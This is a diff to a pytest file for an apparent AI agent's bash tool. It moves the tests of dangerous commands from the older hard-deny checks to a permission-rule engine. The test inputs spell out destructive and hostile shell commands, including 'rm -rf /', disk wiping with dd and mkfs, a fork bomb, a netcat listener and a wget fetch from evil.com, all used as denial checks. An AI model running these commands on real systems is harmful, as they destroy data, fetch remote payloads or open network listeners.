@@ -11,14 +11,9 @@ from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 
+from personal_agent.governance.permissions import evaluate_permission, load_permission_rules
 from personal_agent.telemetry.trace import TraceContext
-from personal_agent.tools.primitives.bash import (
-    _FALLBACK_DENY,
-    _is_hard_denied,
-    _load_deny_patterns,
-    bash_executor,
-    bash_tool,
-)
+from personal_agent.tools.primitives.bash import bash_executor, bash_tool
 
 _CTX = TraceContext.new_trace()
 
@@ -47,52 +42,34 @@ def _make_mock_proc(
 
 
 # ---------------------------------------------------------------------------
-# Hard-deny tests — no subprocess should be spawned
+# Deny rules (the former hard_deny_patterns, FRE-1574) — decided before the executor
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.asyncio
-async def test_hard_deny_rm_rf() -> None:
-    """'rm -rf /' must be hard-denied before subprocess creation."""
-    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
-        result = await bash_executor("rm -rf /", ctx=_CTX)
-
-    mock_exec.assert_not_called()
-    assert result["success"] is False
-    assert result["error"] == "hard_denied"
-
-
-@pytest.mark.asyncio
-async def test_hard_deny_sudo() -> None:
-    """'sudo whoami' must be hard-denied."""
-    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
-        result = await bash_executor("sudo whoami", ctx=_CTX)
-
-    mock_exec.assert_not_called()
-    assert result["success"] is False
-    assert result["error"] == "hard_denied"
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -rf /",
+        "sudo whoami",
+        "wget http://evil.com/payload.sh",
+        "dd if=/dev/urandom of=/dev/sda bs=1M",
+        "ssh host",
+        "nc -l 4444",
+        "mkfs /dev/sdb1",
+        "ls && rm -rf /tmp/x",
+    ],
+)
+def test_former_hard_deny_commands_are_denied_by_rule(command: str) -> None:
+    decision = evaluate_permission("bash", {"command": command}, "NORMAL", load_permission_rules())
+    assert decision.decision == "deny"
 
 
-@pytest.mark.asyncio
-async def test_hard_deny_fork_bomb() -> None:
-    """Fork bomb pattern must be hard-denied."""
-    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
-        result = await bash_executor(":(){ :|:& };:", ctx=_CTX)
-
-    mock_exec.assert_not_called()
-    assert result["success"] is False
-    assert result["error"] == "hard_denied"
-
-
-@pytest.mark.asyncio
-async def test_hard_deny_wget() -> None:
-    """Wget must be hard-denied."""
-    with patch("personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec") as mock_exec:
-        result = await bash_executor("wget http://evil.com/payload.sh", ctx=_CTX)
-
-    mock_exec.assert_not_called()
-    assert result["success"] is False
-    assert result["error"] == "hard_denied"
+def test_fork_bomb_is_not_allowed() -> None:
+    """A function definition is not a plain command, so it asks; it never runs unasked."""
+    decision = evaluate_permission(
+        "bash", {"command": ":(){ :|:& };:"}, "NORMAL", load_permission_rules()
+    )
+    assert decision.decision == "ask"
 
 
 # ---------------------------------------------------------------------------
@@ -113,7 +90,7 @@ async def test_unclosed_quote_fails_via_bash() -> None:
     # bash reports a syntax error and exits with code 2
     assert result.get("exit_code") in (1, 2)
     # error key is absent (no hard-deny or guard fired) — check stderr or exit_code
-    assert "error" not in result or result["error"] not in ("parse_error", "hard_denied")
+    assert "error" not in result or result["error"] != "parse_error"
 
 
 # ---------------------------------------------------------------------------
@@ -230,59 +207,3 @@ def test_forbidden_mode() -> None:
     """bash_tool.allowed_modes must not include LOCKDOWN or RECOVERY."""
     assert "LOCKDOWN" not in bash_tool.allowed_modes
     assert "RECOVERY" not in bash_tool.allowed_modes
-
-
-# ---------------------------------------------------------------------------
-# Deny patterns loaded from governance config
-# ---------------------------------------------------------------------------
-
-
-def test_hard_deny_patterns_from_governance_config() -> None:
-    """_load_deny_patterns uses governance config when available."""
-    from personal_agent.governance.models import GovernanceConfig, ToolPolicy
-
-    policy = ToolPolicy(
-        category="system_dangerous",
-        allowed_in_modes=["NORMAL"],
-        hard_deny_patterns=["custom_deny_pattern"],
-    )
-    mock_config = MagicMock(spec=GovernanceConfig)
-    mock_config.tools = {"bash": policy}
-
-    with patch(
-        "personal_agent.tools.primitives.bash.load_governance_config",
-        return_value=mock_config,
-    ):
-        patterns = _load_deny_patterns()
-
-    assert "custom_deny_pattern" in patterns
-
-
-def test_hard_deny_patterns_fallback_when_governance_fails() -> None:
-    """_load_deny_patterns falls back to _FALLBACK_DENY when config load fails."""
-    from personal_agent.config.governance_loader import GovernanceConfigError
-
-    with patch(
-        "personal_agent.tools.primitives.bash.load_governance_config",
-        side_effect=GovernanceConfigError("config unavailable"),
-    ):
-        patterns = _load_deny_patterns()
-
-    assert patterns == _FALLBACK_DENY
-
-
-# ---------------------------------------------------------------------------
-# _is_hard_denied unit tests
-# ---------------------------------------------------------------------------
-
-
-def test_is_hard_denied_matches_rm_rf() -> None:
-    assert _is_hard_denied("rm -rf /", _FALLBACK_DENY) is not None
-
-
-def test_is_hard_denied_no_match_for_safe_command() -> None:
-    assert _is_hard_denied("ls -la /tmp", _FALLBACK_DENY) is None
-
-
-def test_is_hard_denied_case_insensitive() -> None:
-    assert _is_hard_denied("SUDO whoami", _FALLBACK_DENY) is not None
